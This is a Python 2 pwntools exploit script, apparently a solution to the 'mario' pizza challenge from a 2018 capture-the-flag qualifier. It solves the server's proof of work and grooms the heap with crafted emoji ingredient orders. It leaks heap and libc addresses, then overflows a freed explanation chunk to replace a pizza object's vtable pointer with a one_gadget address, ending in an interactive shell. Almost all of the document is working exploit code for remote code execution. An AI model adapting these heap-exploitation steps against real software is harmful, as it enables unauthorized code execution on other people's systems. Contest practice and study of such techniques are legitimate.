from pwn import *
context.terminal = ['tmux', 'splitw', '-h']

def pow_hash(challenge, solution):
    return hashlib.sha256(challenge.encode('ascii') + struct.pack('<Q', solution)).hexdigest()

def check_pow(challenge, n, solution):
    h = pow_hash(challenge, solution)
    return (int(h, 16) % (2**n)) == 0

def solve_pow(challenge, n):
    candidate = 0
    while True:
        if check_pow(challenge, n, candidate):
            return candidate
        candidate += 1

def do_pow():
    messages = p.recvuntil("Solution:")
    messages = messages.split("\n")
    challenge = messages[1].split(": ")[1]
    n = int(messages[2].split(": ")[1])
    print challenge, n

    payload = solve_pow(challenge, n)
    print "Finish proof of work: ", payload

    p.sendline(str(payload))

if len(sys.argv) > 1 and sys.argv[1] == 'remote':
    p = remote("83b1db91.quals2018.oooverflow.io", 31337)
    do_pow()
else:
    p = process("./mario")
    if len(sys.argv) > 1 and sys.argv[1] == 'gdb':
        gdb.attach(p, """
              set disassembly-flavor intel
              tracemalloc on
               b *(0x555555554000 + 0x20f1)
               b *(0x555555554000 + 0x20bb)
               b *(0x555555554000 + 0x269a)
               b *(0x555555554000 + 0x28fe)
               b *(0x555555554000 + 0x243a)
               b *(0x555555554000 + 0x2f18)
               """)

tomato = "F09f8d85".decode("hex")
chicken = "F09f9094".decode("hex")
banana = "F09f8d8c".decode("hex")
poo = "F09f92a9".decode("hex")
pineapple = "f09f8d8d".decode('hex')

def new(name):
    print p.recvuntil("Choice:")
    p.sendline("N")
    p.recvuntil("name?")
    p.sendline(name)

def login(name):
    print p.recvuntil("Choice:")
    p.sendline("L")
    print p.recvuntil("name?")
    p.sendline(name)

def cook(declare):
    p.recvuntil("Choice:")
    p.sendline("C")
    p.recvuntil("explain:")
    p.sendline(declare)
    print p.recvuntil("USER MENU")

def order(num, ingreds):
    p.recvuntil("Choice:")
    p.sendline("O")
    p.recvuntil("how many pizzas?")
    p.sendline(str(num)) 
    for i in range(num):
        print "[+] pizza 1, ingreds", ingreds[i]
        p.recvuntil("how many ingredients?")
        p.sendline(str(len(ingreds[i])))

        for j in ingreds[i]:
            print p.recvuntil(":")
            p.sendline(j)

def admire():
    print p.recvuntil("Choice:")
    p.sendline("A")
    print p.recvline()

def leave():
    p.recvuntil("Choice:")
    p.sendline("L")

# Overflow kicks out to login prompt, no need to leave
def overflow(buf):
    p.recvuntil("Choice:")
    p.sendline("P")
    print p.recvuntil("explain yourself:")
    p.sendline(buf)
    
def leak():
    print p.recvuntil("Choice:")
    p.sendline("W")
    print p.recvuntil("say:")
    return repr(p.recvline())

print "[+] Leak phase"
new("AAAAAAAA")
# order(1, [tomato])
# cook("C"*290) # smallbin-sized declare, freed

order(17, [[tomato]]*1 + [[tomato + "\xf0\x9f\xf0\x9f", pineapple[2:]+tomato]]*16)
cook("Q"*260) # smallbin-sized declare, freed and placed in unsorted bin
leave()

heap_leak = leak()
heap_leak = heap_leak.decode("string_escape")[2:8]
heap_leak = unpack(heap_leak, 'all')
print "heap leak", hex(heap_leak)

# Groom heap to clear unsorted bin
new("BBBBBBBB")
order(1, [[tomato]])
cook("F"*260) # smallbin-sized declare
leave()

lk = leak()
lk = lk[2:-3]
lk = lk.decode("string_escape")
libc_leak = unpack(lk, 'all')
print "libc leak", hex(libc_leak)

# Offset calculated in gdb 
libc_base = libc_leak - 0x3c4b78
print "libc_base", hex(libc_base)
one_gadget = libc_base + 0x4526a

print '[+] exploit phase'
# Get a Pizza on the heap inside our freed explanation chunk
login("BBBBBBBB")
order(1, [[tomato]])
cook('YYYY')
leave()

# Offset calculated in gdb 
one_gadget_heap_addr = heap_leak-0xf90

# Perform the overflow of BBBB's pizza vtable ptr with ptr to one_gadget
login('AAAAAAAA')
overflow(p64(one_gadget)*2 + "Z"*144 + p64(one_gadget_heap_addr)*2) # we got kicked out to login prompt

# Print B's pizzas, call one_gadget and win
login("BBBBBBBB")
admire()
p.interactive()



